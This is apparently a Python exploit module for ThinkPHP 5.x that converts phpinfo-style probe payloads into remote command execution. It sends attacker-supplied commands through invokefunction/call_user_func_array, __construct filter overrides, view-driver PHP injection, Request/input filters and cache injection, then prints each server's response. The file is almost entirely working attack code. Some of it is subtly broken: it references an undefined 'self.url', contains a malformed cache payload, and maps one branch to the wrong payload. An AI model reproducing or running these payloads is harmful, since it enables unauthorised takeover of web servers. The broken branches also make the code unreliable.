# -*- coding: utf-8 -*-

import requests


headers = {
        'Content-Type': "application/x-www-form-urlencoded",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
    }



class Exp:
# 命令执行
    def __init__(self, target, check, cmd):
        headers = {
            'Content-Type': "application/x-www-form-urlencoded",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
        }
        self.target = target
        self.check = check
        self.cmd = cmd
        self.headers = headers

    def check_exp(self):
        for method in list(self.check.keys()):
            if method == "tp5_route_rce_get":
                self.method = "tp5_route_rce_get"
                if self.check_5_x_route_rce_get_exp() == False:
                    continue
                else:
                    break

            elif method == "tp5_construct_rce":
                self.method = "tp5_construct_rce"
                if self.check_5_x_construct_rce_exp() == False:
                    continue
                else:
                    break
            elif method == "tp5_construct_other":
                self.method = "tp5_construct_other"
                if self.check_5_x_construct_other_exp() == False:
                    continue
                else:
                    break
            elif method == "tp5_driver_rce":
                self.method = "tp5_driver_rce"
                if self.check_5_x_driver_rce_exp() == False:
                    continue
                else:
                    break
            elif method == "tp5_showid_rce":
                self.method = "tp5_showid_rce"
                if self.check_5_x_showid_rce_exp() == False:
                    continue
                else:
                    break
            elif method == "tp5_lite_code_rce":
                self.method = "tp5_lite_code_rce"
                if self.check_5_x_lite_code_rce_exp() == False:
                    continue
                else:
                    break
            elif method == "tp5_cache_rce":
                self.method = "tp5_cache_rce"
                if self.check_5_x_cache_rce_exp() == False:
                    continue
                else:
                    break
            else:
                print("暂无可利用的poc!")

    def check_5_x_route_rce_get_exp(self):
        try:
            poc = self.check[self.method]
            if "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
                exp_code = self.target + "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
                res = requests.get(exp_code, headers=headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
                exp_code = self.target + "?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
                res = requests.get(exp_code, headers=headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
                exp_code = self.target + "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
                res = requests.get(exp_code, headers=headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == poc:
                exp_code = self.target + "?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(self.cmd)
                res = requests.get(exp_code, headers=headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            else:
                pass
        except Exception as e:
            print("请求超时或利用异常!")
    def check_5_x_construct_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
                exp_code = "_method=__construct&filter[]=system&method=GET&get[]={0}".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
                exp_code = "s={0}&_method=__construct&method=POST&filter[]=system".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "aaaa=1&_method=__construct&method=GET&filter[]=phpinfo" == poc:
                exp_code ="aaaa={0}&_method=__construct&method=GET&filter[]=system".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "c=phpinfo&f=1&_method=filter" == poc:
                exp_code = "c=system&f={0}&_method=filter".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1" == poc:
                exp_code = "_method=__construct&filter[]=system&server[REQUEST_METHOD]={0}".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            else:
                pass
        except Exception as e:
            print("请求超时或利用异常!")
    def check_5_x_construct_other_exp(self):
        try:
            poc = self.check[self.method]

            if "_method=__construct&filter[]=phpinfo&method=GET&get[]=1" == poc:
                exp_code = "_method=__construct&filter[]=system&method=GET&get[]={0}".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1" == poc:
                exp_code = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={0}".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "s=1&_method=__construct&method=POST&filter[]=phpinfo" == poc:
                exp_code = "s={0}&_method=__construct&method=POST&filter[]=system".format(self.cmd)
                res = requests.post(self.target, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            else:
                pass
        except Exception as e:
            print("请求超时或利用异常!")
    def check_5_x_driver_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>" == poc:
                exp_code = self.target + "?s=index/think\\view\\driver\\Php/display&content=<?php system({0});?>".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "?s=index/\\think\\view\\driver\\Php/display&content=<?php phpinfo();?>" == poc:
                exp_code = self.target + "?s=index/\\think\\view\\driver\\Php/display&content=<?php system({0});?>".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
        except Exception as e:
            print("请求超时或利用异常!")
    def check_5_x_showid_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~phpinfo()}]" == poc:
                exp_code = self.target + "?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~system({0})}]".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
        except Exception as e:
            print("请求超时或利用异常!")
    def check_5_x_request_input_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "?s=index/\\think\\Request/input&filter=phpinfo&data=1" == poc:
                exp_code = self.target + "?s=index/\\think\\Request/input&filter=system&data={0}".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            elif "?s=index/think\\Request/input&filter=phpinfo&data=1" == poc:
                exp_code = self.target + "?s=index/think\\Request/input&filter=system&data={0}".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            else:
                print("[-]check_5_x_request_input_rce_exp利用失败")
        except Exception as e:
            print("请求超时或利用异常!")

    def check_5_x_lite_code_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "/index.php/module/action/param1/${@print(var_dump(iceberg))}" == poc:
                exp_code = self.target + "?s=index/\\think\\Request/input&filter=system&data={0}".format(self.cmd)
                res = requests.get(exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            else:
                print("[-]check_5_x_lite_code_rce_exp利用失败")
        except Exception as e:
            print("请求超时或利用异常!")

    def check_5_x_cache_rce_exp(self):
        try:
            poc = self.check[self.method]
            if "%0d%0avar_dump('iceberg-N');%0d%0a//" == poc:
                exp_code = "%0d%0system({0});%0d%0a//".format(self.cmd)
                poc_url = self.url + "/index.php/Home/Index/index.html"
                res = requests.post(poc_url, data=exp_code, headers=self.headers, timeout=10)
                if res.status_code == 200:
                    print(res.text)
                else:
                    return False
            else:
                print("[-]check_5_x_cache_rce_exp利用失败")
        except Exception as e:
            print("请求超时或利用异常!")

    # def exp(self, exp_url, cmd):
    #     try:
    #         if "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == exp_url[1]:
    #             exp_code = exp_url[0] + "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(cmd)
    #         elif "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" == exp_url[1]:
    #             exp_code = exp_url[0] + "?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={0}".format(cmd)
    #
    #         res = requests.get(exp_code, headers=headers)
    #         return res.text
    #
    #     except Exception as e:
    #         print("[-] 参数错误")